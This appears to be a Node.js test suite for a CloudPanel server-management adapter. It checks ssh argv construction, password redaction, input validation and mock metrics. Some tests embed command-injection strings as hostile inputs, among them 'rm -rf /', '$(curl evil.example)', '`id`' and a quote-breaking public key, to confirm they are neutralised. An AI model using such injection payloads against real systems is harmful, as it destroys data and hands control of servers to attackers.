// CloudPanel adapter tests. No network and no ssh: every exec is a fake that records its calls.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createCloudPanel, parseLiveMetrics, redact } from '../adapters/cloudpanel.mjs';
import { createStore } from '../store.mjs';
import { seedIfEmpty } from '../seed.mjs';
import { ValidationError, parseSiteSpec } from '../validate.mjs';

const KEY = '/keys/lrweb_ed25519';

const mockConfig = () => ({
  demoDelayMs: 0,
  cloudpanel: { mode: 'mock', ssh: { keyPath: '', knownHostsPath: '', connectTimeoutSec: 10, useSudo: true } },
});
const sshConfig = (ssh = {}) => ({
  demoDelayMs: 0,
  cloudpanel: { mode: 'ssh', ssh: { keyPath: KEY, knownHostsPath: '', connectTimeoutSec: 10, useSudo: true, ...ssh } },
});
const freshStore = () => {
  const store = createStore({ memory: true });
  seedIfEmpty(store);
  return store;
};
// Mock mode must never spawn anything.
const noExec = async () => { throw new Error('exec must not run in mock mode'); };
function fakeExec(handler = async () => ({ stdout: '', stderr: '' })) {
  const calls = [];
  const exec = async (file, args, opts) => {
    calls.push({ file, args, opts });
    return handler(file, args, opts);
  };
  return { exec, calls };
}

test('describe never leaks the key path and reports readiness', () => {
  const mock = createCloudPanel({ config: mockConfig(), store: freshStore(), exec: noExec }).describe();
  assert.equal(mock.mode, 'mock');
  assert.equal(mock.ready, true);

  const live = createCloudPanel({ config: sshConfig(), store: freshStore(), exec: noExec }).describe();
  assert.equal(live.mode, 'ssh');
  assert.equal(live.ready, false); // the fake key file does not exist
  assert.ok(!JSON.stringify(live).includes('/keys/'));
});

test('bootstrapScript keeps a hostile name inside one comment line', () => {
  const cp = createCloudPanel({ config: mockConfig(), store: freshStore(), exec: noExec });
  const name = 'web\nrm -rf / $(curl evil.example) `id` ; echo pwned';
  const { script } = cp.bootstrapScript({ os: 'ubuntu-24.04', dbEngine: 'MYSQL_8.4', name, installCloudpanel: true, sshPort: 22 });
  const lines = script.split('\n');

  assert.ok(lines.every((l) => !l.startsWith('rm ')));
  assert.ok(!script.includes('$(curl'));
  assert.ok(!script.includes('`id`'));
  for (const l of lines.filter((l) => l.includes('pwned'))) assert.ok(l.startsWith('# '), l);
  assert.match(script, /DB_ENGINE=MYSQL_8\.4 bash \/root\/cloudpanel-install\.sh/);
  assert.match(script, /read -r -p .* ok <\/dev\/tty/);
});

test('bootstrapScript embeds a valid public key and swaps a malformed one for a placeholder', () => {
  const dir = mkdtempSync(join(tmpdir(), 'lrweb-cp-'));
  try {
    const keyPath = join(dir, 'lrweb_ed25519');
    const good = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGoodKeyBase64+/= lrweb-console';
    writeFileSync(`${keyPath}.pub`, `${good}\n`);
    const ok = createCloudPanel({ config: sshConfig({ keyPath }), store: freshStore(), exec: noExec })
      .bootstrapScript({});
    assert.equal(ok.publicKey, good);
    assert.ok(ok.script.includes(`'${good}'`));
    assert.ok(!ok.script.includes('cloudpanel-install.sh'), 'installer is opt-in');

    writeFileSync(`${keyPath}.pub`, "ssh-ed25519 AAAAC3Nza'; rm -rf / #\n");
    const bad = createCloudPanel({ config: sshConfig({ keyPath }), store: freshStore(), exec: noExec })
      .bootstrapScript({});
    assert.equal(bad.publicKey, 'ssh-ed25519 AAAA_REPLACE_WITH_LRWEB_PUBLIC_KEY lrweb-console');
    assert.ok(bad.notes.some((n) => n.startsWith('WARNING')));
    assert.ok(!bad.script.includes('rm -rf'));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('createSite in ssh mode runs clpctl with the exact argv and no shell', async () => {
  const { exec, calls } = fakeExec();
  const cp = createCloudPanel({ config: sshConfig(), store: freshStore(), exec });
  const spec = parseSiteSpec({ serverId: 'srv_ldn1', domain: 'shop.example.com', type: 'php' });

  const { siteUser, siteUserPassword } = await cp.createSite('srv_ldn1', spec);

  assert.equal(calls.length, 1);
  const { file, args, opts } = calls[0];
  assert.equal(file, 'ssh');
  assert.deepEqual(args, [
    '-i', KEY, '-p', '22',
    '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10', '-o', 'IdentitiesOnly=yes', '-o', 'StrictHostKeyChecking=accept-new',
    '--', 'lrweb@203.0.113.10',
    `sudo -n clpctl 'site:add:php' '--domainName=shop.example.com' '--phpVersion=8.3' '--vhostTemplate=Generic' '--siteUser=shopexample' '--siteUserPassword=${siteUserPassword}'`,
  ]);
  assert.equal(siteUser, 'shopexample');
  assert.equal(opts.timeout, 120_000);
  assert.equal(opts.maxBuffer, 1024 * 1024);
  assert.equal(opts.shell, undefined);
});

test('ssh failures never put argv or passwords into the error', async () => {
  let password = '';
  const { exec } = fakeExec(async (_file, args) => {
    password = /--siteUserPassword=([A-Za-z0-9]+)'/.exec(args.at(-1))[1];
    // Mimic execFile, whose own message embeds the full command line.
    throw Object.assign(new Error(`Command failed: ssh ${args.join(' ')}\nsudo: a password is required ${password}`), {
      code: 1,
      stderr: `sudo: a password is required --siteUserPassword=${password}\n`,
    });
  });
  const cp = createCloudPanel({ config: sshConfig(), store: freshStore(), exec });
  const spec = parseSiteSpec({ serverId: 'srv_ldn1', domain: 'shop.example.com', type: 'static' });

  await assert.rejects(cp.createSite('srv_ldn1', spec), (err) => {
    assert.equal(err.status, 502);
    assert.equal(err.code, 'clpctl_failed');
    assert.ok(password.length > 10);
    assert.ok(!err.message.includes(password), err.message);
    assert.ok(!err.message.includes('siteUserPassword'), err.message);
    assert.ok(!err.message.includes('ssh -i'), err.message);
    return true;
  });
});

test('an ssh connection failure is reported with the ssh_failed code', async () => {
  const { exec } = fakeExec(async () => {
    throw Object.assign(new Error('Command failed: ssh ...'), { code: 255, stderr: 'Permission denied (publickey).\n' });
  });
  const cp = createCloudPanel({ config: sshConfig(), store: freshStore(), exec });
  await assert.rejects(cp.deleteSite('srv_ldn1', 'shop.example.com'), (err) => {
    assert.equal(err.status, 502);
    assert.equal(err.code, 'ssh_failed');
    assert.equal(err.message, 'SSH connection failed: Permission denied (publickey).');
    return true;
  });
});

test('hostile domains are rejected before any ssh call', async () => {
  const store = freshStore();
  for (const domain of ['shop.example.com; rm -rf /', 'shop example.com', 'a.example.com$(id)']) {
    const { exec, calls } = fakeExec();
    const cp = createCloudPanel({ config: sshConfig(), store, exec });
    await assert.rejects(
      cp.createSite('srv_ldn1', { domain, type: 'static', siteUser: 'shopexample' }),
      (err) => err instanceof ValidationError && err.status === 400 && err.field === 'domain',
    );
    await assert.rejects(cp.deleteSite('srv_ldn1', domain), ValidationError);
    assert.equal(calls.length, 0, domain);
  }
});

test('mock checkServer brings a pending server online', async () => {
  const store = freshStore();
  const cp = createCloudPanel({ config: mockConfig(), store, exec: noExec });
  const events = [];

  const result = await cp.checkServer('srv_stg1', (e) => events.push(`${e.key}:${e.status}`));

  assert.equal(result.ok, true);
  assert.equal(result.clpctlVersion, '2.x');
  assert.equal(store.get('servers', 'srv_stg1').status, 'online');
  assert.equal(store.get('servers', 'srv_stg1').panelVersion, '2.5.1');
  assert.deepEqual(events, [
    'ssh:running', 'ssh:done', 'clpctl:running', 'clpctl:done',
    'panel:running', 'panel:done', 'os:running', 'os:done',
  ]);
});

test('mock checkServer reports an ssh failure and leaves the status alone', async () => {
  const store = freshStore();
  const row = store.insert('servers', {
    name: 'fail-test-01', host: '192.0.2.99', sshPort: 22, sshUser: 'lrweb', os: 'debian-12',
    provider: '', region: '', status: 'pending', panelVersion: '', createdAt: new Date().toISOString(),
  });
  const cp = createCloudPanel({ config: mockConfig(), store, exec: noExec });
  const events = [];

  const result = await cp.checkServer(row.id, (e) => events.push(`${e.key}:${e.status}`));

  assert.deepEqual(result, { ok: false, error: 'Connection timed out' });
  assert.equal(store.get('servers', row.id).status, 'pending');
  assert.deepEqual(events, [
    'ssh:running', 'ssh:failed', 'clpctl:skipped', 'panel:skipped', 'os:skipped',
  ]);
});

test('mock metrics returns a 60-point series that stays inside its band', async () => {
  const cp = createCloudPanel({ config: mockConfig(), store: freshStore(), exec: noExec });
  const m = await cp.metrics('srv_ldn1');

  for (const key of ['cpu', 'mem', 'net', 'labels']) assert.equal(m[key].length, 60, key);
  assert.ok(m.cpu.every((v) => v >= 15 && v <= 55));
  assert.ok(m.labels.every((iso) => iso === new Date(iso).toISOString()));
  assert.ok(m.labels.every((iso, i) => i === 0 || Date.parse(iso) - Date.parse(m.labels[i - 1]) === 60_000));
  assert.equal(m.current.cpu, m.cpu.at(-1));
  assert.equal(m.current.load.length, 3);
  assert.ok(Number.isInteger(m.current.uptimeSec) && m.current.uptimeSec > 0);
  assert.ok(m.current.disk >= 28 && m.current.disk <= 73);

  // Within the same minute the numbers must not change.
  const again = await cp.metrics('srv_ldn1');
  if (again.labels.at(-1) === m.labels.at(-1)) assert.deepEqual(again.cpu, m.cpu);
});

test('mock metrics keeps the degraded server hot', async () => {
  const cp = createCloudPanel({ config: mockConfig(), store: freshStore(), exec: noExec });
  const m = await cp.metrics('srv_dub1');
  assert.ok(m.cpu.every((v) => v >= 80 && v <= 92), JSON.stringify(m.cpu));
});

test('pending servers have no metrics and refuse metrics and site creation', async () => {
  const cp = createCloudPanel({ config: mockConfig(), store: freshStore(), exec: noExec });

  await assert.rejects(cp.metrics('srv_stg1'), (err) => err.status === 409 && err.code === 'not_ready');
  await assert.rejects(
    cp.createSite('srv_stg1', { domain: 'a.example.com', type: 'static', siteUser: 'aexample' }),
    (err) => err.status === 409,
  );
  const servers = await cp.listServers();
  assert.equal('metrics' in servers.find((s) => s.id === 'srv_stg1'), false);
});

test('listServers attaches siteCount and the current metrics snapshot', async () => {
  const store = freshStore();
  const cp = createCloudPanel({ config: mockConfig(), store, exec: noExec });

  const servers = await cp.listServers();
  const nyc = servers.find((s) => s.id === 'srv_ldn1');

  assert.ok(nyc.siteCount > 0);
  assert.equal(nyc.siteCount, store.find('sites', (s) => s.serverId === 'srv_ldn1').length);
  assert.equal(nyc.panelUrl, 'https://203.0.113.10:8443');
  assert.equal(typeof nyc.metrics.cpu, 'number');
});

test('mock createSite returns credentials once and never writes them to the store', async () => {
  const store = freshStore();
  const cp = createCloudPanel({ config: mockConfig(), store, exec: noExec });
  const events = [];

  const spec = parseSiteSpec({ serverId: 'srv_ldn1', domain: 'brand.example.com', type: 'static' });
  const { siteUser, siteUserPassword } = await cp.createSite('srv_ldn1', spec, (e) => events.push(e.status));

  assert.equal(siteUser, 'brandexample');
  assert.match(siteUserPassword, /^[A-Za-z0-9]{22}$/);
  assert.deepEqual(events, ['running', 'done']);
  const dump = JSON.stringify(['servers', 'sites', 'events'].map((c) => store.all(c)));
  assert.ok(!dump.includes(siteUserPassword));
});

test('ssh metrics parse the fixed probe and pad history with the first sample', async () => {
  const output = [
    'LOAD', '0.80 0.60 0.40 1/200 999',
    'UPTIME', '12345.67 9000.00',
    'CPUS', '4',
    'MEM', 'total used free shared buff/cache available',
    'Mem: 8000 2000 1000 10 5000 6000',
    'Swap: 0 0 0',
    'DISK', 'Filesystem 1024-blocks Used Available Capacity Mounted on',
    '/dev/vda1 100000 40000 60000 40% /',
    'NET', 'Inter-|   Receive', ' face |bytes    packets',
    '    lo: 100 0 0 0 0 0 0 0 100 0 0 0 0 0 0 0',
    '  eth0: 1000000 0 0 0 0 0 0 0 2000000 0 0 0 0 0 0 0',
  ].join('\n');
  const { exec, calls } = fakeExec(async () => ({ stdout: output, stderr: '' }));
  const cp = createCloudPanel({ config: sshConfig(), store: freshStore(), exec });

  const m = await cp.metrics('srv_ldn1');

  assert.equal(calls[0].file, 'ssh');
  assert.equal(m.cpu.length, 60);
  assert.ok(m.cpu.every((v) => v === 20));
  assert.ok(m.net.every((v) => v === 0)); // first sample has no rate yet
  assert.deepEqual(m.current, { cpu: 20, mem: 25, disk: 40, load: [0.8, 0.6, 0.4], uptimeSec: 12345 });
});

test('parseLiveMetrics rejects output it cannot read', () => {
  assert.throws(() => parseLiveMetrics('garbage'), (err) => err.status === 502 && err.code === 'metrics_unavailable');
});

test('ssh checkServer stops at the first failing step and reports the rest as skipped', async () => {
  const store = freshStore();
  const { exec } = fakeExec(async () => {
    throw Object.assign(new Error('Command failed: ssh ...'), {
      code: 255,
      stderr: 'ssh: connect to host 203.0.113.10 port 22: Connection timed out\n',
    });
  });
  const cp = createCloudPanel({ config: sshConfig(), store, exec });
  const events = [];

  const result = await cp.checkServer('srv_ldn1', (e) => events.push(`${e.key}:${e.status}`));

  assert.equal(result.ok, false);
  assert.match(result.error, /^SSH connection failed: ssh: connect to host 203\.0\.113\.10/);
  assert.deepEqual(events, ['ssh:running', 'ssh:failed', 'clpctl:skipped', 'panel:skipped', 'os:skipped']);
  assert.equal(store.get('servers', 'srv_ldn1').status, 'online');
});

test('redact strips password flags and known secret values', () => {
  assert.equal(redact('x --siteUserPassword=abc123 y'), 'x [redacted] y');
  assert.equal(redact('Password: hunter2'), 'Password: [redacted]');
  assert.equal(redact('leak XYZ123 here', ['XYZ123']), 'leak [redacted] here');
});
